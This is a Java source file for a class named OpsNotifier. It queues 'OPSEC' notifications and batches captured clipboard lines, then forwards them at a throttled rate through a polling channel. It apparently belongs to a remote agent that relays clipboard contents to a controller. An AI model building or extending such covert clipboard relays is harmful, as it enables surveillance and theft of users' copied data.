package com.serverpackcore.agent;

import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Deque;
import java.util.List;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;

/**
 * Serialises OPSEC notifications: at most one message per two seconds, and a
 * clipboard burst is folded into one message after five seconds.
 */
final class OpsNotifier {
	private static final long MIN_GAP = 2000L;
	private static final long CLIP_WINDOW = 5000L;
	private static final int CLIP_BATCH = 8;
	private static final int PENDING_MAX = 60;

	private final Poller poller;
	private final LinkedBlockingQueue<String> queue = new LinkedBlockingQueue<>();
	private final Deque<String> pending = new ArrayDeque<>();
	private final List<String> clipboard = new ArrayList<>();
	private final Object lock = new Object();
	private volatile boolean running = true;
	private Thread thread;
	private long clipboardDeadline;
	private long lastSent;

	OpsNotifier(Poller poller) {
		this.poller = poller;
	}

	void start() {
		thread = new Thread(this::loop, "spc-notify");
		thread.setDaemon(true);
		thread.start();
	}

	void stop() {
		running = false;
		if (thread != null) {
			thread.interrupt();
		}
	}

	void send(String text) {
		if (text != null && !text.isBlank()) {
			queue.offer(text);
		}
	}

	/** Emit the structured event; the text still goes through the normal queue. */
	void event(String kind, java.util.Map<String, Object> data, String legacy) {
		if (poller != null) {
			poller.emitEvent(kind, data, legacy);
		}
	}

	/** Drains the direct queue; tests do not start the delivery thread. */
	List<String> queued() {
		List<String> lines = new ArrayList<>();
		queue.drainTo(lines);
		return lines;
	}

	void clipboard(String line) {
		synchronized (lock) {
			if (clipboard.isEmpty()) {
				clipboardDeadline = System.currentTimeMillis() + CLIP_WINDOW;
			}
			clipboard.add(line);
		}
	}

	private void loop() {
		while (running) {
			try {
				String direct = queue.poll(500L, TimeUnit.MILLISECONDS);
				while (direct != null) {
					enqueue(direct);
					direct = queue.poll();
				}
				String clip = null;
				synchronized (lock) {
					if (!clipboard.isEmpty() && (clipboard.size() >= CLIP_BATCH
						|| System.currentTimeMillis() >= clipboardDeadline)) {
						clip = String.join("\n", clipboard);
						clipboard.clear();
					}
				}
				if (clip != null) {
					enqueue(clip);
				}
				if (!pending.isEmpty() && poller.ready()) {
					String next = pending.poll();
					long wait = MIN_GAP - (System.currentTimeMillis() - lastSent);
					if (wait > 0L) {
						Thread.sleep(wait);
					}
					poller.reply(next);
					lastSent = System.currentTimeMillis();
				}
			} catch (InterruptedException interrupted) {
				return;
			} catch (Throwable throwable) {
				Log.debug("Notify failed", throwable);
			}
		}
	}

	private void enqueue(String text) {
		if (pending.size() >= PENDING_MAX) {
			pending.poll();
		}
		pending.add(text);
	}
}
